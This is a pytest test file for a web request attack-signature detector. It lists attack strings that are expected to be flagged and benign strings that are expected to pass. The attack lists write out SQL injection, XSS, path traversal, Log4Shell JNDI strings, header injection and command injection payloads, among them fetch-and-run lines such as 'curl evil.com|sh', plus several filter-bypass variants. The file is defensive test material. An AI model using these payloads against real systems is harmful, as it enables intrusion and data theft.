"""Tests for payload attack-signature detection."""

import time

import pytest

from app.services.payload_signals import detect_payload_indicators

ATTACKS = [
    ("/api/products", "id=1%27%20UNION%20SELECT%20password%20FROM%20users", b"", "sql-like"),
    ("/api/products", "q=1+union+select+1", b"", "sql-like"),
    ("/api/products", "", b"1 UNION/**/SELECT 1", "sql-like"),
    ("/api/products", "", b"id=1' or '1'='1", "sql-like"),
    ("/api/products", "", b"x';waitfor delay '0:0:15';--", "sql-like"),
    ("/api/products", "id=1%20AND%20SLEEP/**/(5)", b"", "sql-like"),
    ("/api/products", "", b"cantidad='; DROP TABLE usuarios; --", "sql-like"),
    ("/api/products", "q=%2527%2520or%25201%253D1", b"", "sql-like"),
    (
        "/api/products",
        "",
        "ＳＥＬＥＣＴ * ＦＲＯＭ users ＵＮＩＯＮ ＳＥＬＥＣＴ 1".encode(),
        "sql-like",
    ),
    ("/api/products", "", b"<SCRipt>alert(1)</scrIPT>", "xss"),
    ("/api/products", "", b"&lt;img src=x onerror=alert(1)&gt;", "xss"),
    ("/api/products", "", b'{"bio": "\\u003cscript\\u003ealert(1)"}', "xss"),
    ("/api/products", "next=javascript:alert(1)", b"", "xss"),
    ("/api/files/..%2f..%2fetc/passwd", "", b"", "path-traversal"),
    ("/api/files", "f=%252e%252e%252fwin.ini", b"", "path-traversal"),
    ("/api/ping", "", b"host=8.8.8.8;cat /etc/hosts", "rce-indicator"),
    ("/api/ping", "", b"host=x|whoami", "rce-indicator"),
    ("/api/ping", "", b"${jndi:ldap://x/a}", "rce-indicator"),
    ("/api/ping", "", b"a=$(id)", "rce-indicator"),
    ("/api/register", "nombre=any%0d%0aSet-cookie:%20Tamper=1", b"", "header-injection"),
    ("/api/register", "", b"dni=%00&x=1", "null-byte"),
]


@pytest.mark.parametrize("path,query,body,label", ATTACKS)
def test_attack_detected(path, query, body, label):
    assert label in detect_payload_indicators(path, query, body)


BENIGN = [
    ("/api/users", "name=O%27Reilly", b""),
    ("/api/search", "q=Union+Square", b""),
    ("/api/products", "", b"Select your size"),
    ("/api/calc", "expr=2%2B2%3D4", b""),
    ("/api/furniture", "q=drop-leaf+table", b""),
    ("/api/checkout", "precio=85&cantidad=2", b""),
    ("/api/users", "", b'{"email": "ana@example.com", "note": "call me"}'),
    ("/api/notes", "", b'{"text": "line one\\nnote: x\\nsubject: y"}'),
    ("/api/notes", "", b"first line\r\nNote: second line"),
    ("/api/items", "id=2&cmd=list&sh=1&ls=3", b""),
    ("/tienda1/publico/anadir.jsp", "id=1&nombre=Jam%F3n+Ib%E9rico&precio=85", b""),
    ("/api/books", "q=JavaScript%3A+The+Good+Parts", b""),
    ("/api/posts", "", b"I love my dog; cat lovers disagree"),
    ("/api/posts", "", b"Most adults need sleep (8 hours) each night"),
    ("/api/posts", "", b"Show me your id; please"),
]


@pytest.mark.parametrize("path,query,body", BENIGN)
def test_benign_not_flagged(path, query, body):
    assert detect_payload_indicators(path, query, body) == []


def test_latin1_body_does_not_raise():
    result = detect_payload_indicators("/x", "", b"nombre=Jam\xf3n&x=' or 1=1--")
    assert "sql-like" in result


def test_output_sorted_and_unique():
    body = b"' or 1=1-- <script> union select 1 ' or 2=2--"
    assert detect_payload_indicators("/x", "", body) == ["sql-like", "xss"]


def test_adversarial_input_is_fast():
    body = ((b"'" + b"%25" * 10 + b"or ") * 4000)[:65536]
    start = time.perf_counter()
    detect_payload_indicators("/x", "q=" + "%2" * 5000, body)
    assert time.perf_counter() - start < 0.2


def test_double_encoding_flags_encoded():
    assert "encoded" in detect_payload_indicators("/x", "q=%2541", b"")


def test_single_encoding_not_encoded():
    assert "encoded" not in detect_payload_indicators("/x", "q=caf%C3%A9", b"")


def test_inline_comment_between_words_flags_encoded():
    assert "encoded" in detect_payload_indicators("/x", "", b"un/**/ion")


def test_large_payload():
    assert "large-payload" in detect_payload_indicators("/x", "", b"a" * 65537)
    assert "large-payload" not in detect_payload_indicators("/x", "", b"a" * 65536)


def test_unusual_content_type():
    result = detect_payload_indicators(
        "/x", "", b"x", content_type="application/x-java-serialized-object"
    )
    assert "unusual-content-type" in result


@pytest.mark.parametrize(
    "content_type",
    [
        "application/json; charset=utf-8",
        "application/vnd.api+json",
        "multipart/form-data; boundary=x",
        "TEXT/PLAIN",
    ],
)
def test_allowed_content_types(content_type):
    result = detect_payload_indicators("/x", "", b"x", content_type=content_type)
    assert "unusual-content-type" not in result


def test_content_type_ignored_without_body():
    result = detect_payload_indicators(
        "/x", "", b"", content_type="application/octet-stream"
    )
    assert "unusual-content-type" not in result


# --- Final review fix pass (2026-11-07) -----------------------------------


@pytest.mark.parametrize(
    "body",
    [b"%0a" + b"\n" * 65000, b"%0a" + b"\r" * 32000 + b"\n" * 32000, b"%0a" + b"\n " * 32000],
)
def test_line_break_flood_is_fast(body):
    start = time.perf_counter()
    detect_payload_indicators("/x", "", body)
    assert time.perf_counter() - start < 0.2


def _multipart_png() -> bytes:
    return (
        b"--b\r\nContent-Disposition: form-data; name=\"avatar\"; filename=\"a.png\"\r\n"
        b"Content-Type: image/png\r\n\r\n\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\r\n--b--\r\n"
    )


@pytest.mark.parametrize(
    "body,content_type",
    [
        (_multipart_png(), "multipart/form-data; boundary=b"),
        ('{"name": "Ana"}'.encode("utf-16"), "application/json"),
    ],
)
def test_literal_nul_in_binary_body_is_not_null_byte(body, content_type):
    assert "null-byte" not in detect_payload_indicators("/x", "", body, content_type=content_type)


@pytest.mark.parametrize("body", [b'{"dni": "\u0000"}', b"dni=&#0;", b"dni=%00"])
def test_encoded_nul_is_null_byte(body):
    assert "null-byte" in detect_payload_indicators("/x", "", body)


@pytest.mark.parametrize(
    "body",
    [
        b"comment=Great+post%21%0D%0Ahttps%3A%2F%2Fexample.com%2Fdocs",
        b"msg=Hi+team%0D%0ARe%3A+yesterday",
        b"addr=Line1%0D%0Aattn%3A+Bob",
        b"body=Hi%0D%0AThanks%2C%0D%0ABob%0D%0ATel%3A+555-1234",
    ],
)
def test_multiline_form_field_is_not_header_injection(body):
    assert "header-injection" not in detect_payload_indicators("/x", "", body)


@pytest.mark.parametrize(
    "query",
    ["next=%0d%0aLocation:%20https://evil.example", "x=1%0d%0aX-Forwarded-Host:%20evil"],
)
def test_response_header_injection_detected(query):
    assert "header-injection" in detect_payload_indicators("/x", query, b"")


@pytest.mark.parametrize(
    "body",
    [
        b'{"text": "| id | name |\n|---|---|"}',
        b'{"text": "| user | pwd |"}',
        b'{"text": "Set it to \'auto\'; then save"}',
        b'{"text": "Hmm...\nok"}',
        b'{"text": "he said \\"wait..\\" and left"}',
        b"See [guide](../guide.md) for details",
        b"import x from '../lib/util'",
        b'{"text": "is \'a\' or b > c"}',
        b"name' and 'x' like 'y",
        b"Drop table tennis practice",
        b'{"html": "<svg viewBox=\\"0 0 10 10\\"></svg>"}',
        b'{"html": "<iframe src=\\"https://www.youtube.com/embed/x\\"></iframe>"}',
    ],
)
def test_common_prose_and_markup_not_flagged(body):
    high = {"sql-like", "xss", "path-traversal", "rce-indicator", "header-injection", "null-byte"}
    assert not high & set(detect_payload_indicators("/x", "", body))


BYPASSES = [
    (b"1/*!50000union*/+/*!50000select*/+1", "sql-like"),
    (b"-1 UN/**/ION SEL/**/ECT password FROM users", "sql-like"),
    (b"un%2f%2a%2a%2fion select 1", "sql-like"),
    (b"1 union--x%0aselect 1", "sql-like"),
    (b"1 union%23x%0aselect 1", "sql-like"),
    (b"-1 union(select 1)", "sql-like"),
    (b"1 union distinct select 1", "sql-like"),
    (b"1'or'1'='1", "sql-like"),
    (b"1'||1=1--", "sql-like"),
    (b"1 and extractvalue(1,concat(0x7e,version()))", "sql-like"),
    (b"1 and updatexml(1,concat(0x7e,user()),1)", "sql-like"),
    (b"1 and sleep(5-0)", "sql-like"),
    (b"127.0.0.1%0aid", "rce-indicator"),
    (b"x;cat flag.txt", "rce-indicator"),
    (b"x;curl evil.com|sh", "rce-indicator"),
    (b"x;wget evil.com/x", "rce-indicator"),
    (b"x;cat${IFS}/etc/hosts", "rce-indicator"),
    (b"x;/???/c?t /???/p??s??", "rce-indicator"),
    (b"${${lower:j}ndi:ldap://x/a}", "rce-indicator"),
    (b"${${::-j}${::-n}${::-d}${::-i}:ldap://x/a}", "rce-indicator"),
    (b"<div onpointerenter=alert(1)>", "xss"),
    (b"<a onfocusin=alert(1)>", "xss"),
    (b"<a href='java%09script:alert(1)'>x</a>", "xss"),
    (b"next=data:text/html;base64,PHNjcmlwdD4=", "xss"),
    (b"<iframe srcdoc='<script>alert(1)</script>'>", "xss"),
    (b"/x/..;/admin", "path-traversal"),
    (b"file=/proc/self/environ", "path-traversal"),
]


@pytest.mark.parametrize("body,label", BYPASSES)
def test_review_bypass_detected(body, label):
    assert label in detect_payload_indicators("/x", "", body)


def test_attack_after_padding_is_detected():
    body = b"a=" + b"x" * 65536 + b"&q=' union select password from users--"
    assert "sql-like" in detect_payload_indicators("/x", "", body)


def test_full_bounded_body_is_fast():
    body = (b"x" * 1023 + b"\n") * 1024
    start = time.perf_counter()
    detect_payload_indicators("/x", "", body)
    assert time.perf_counter() - start < 1.0
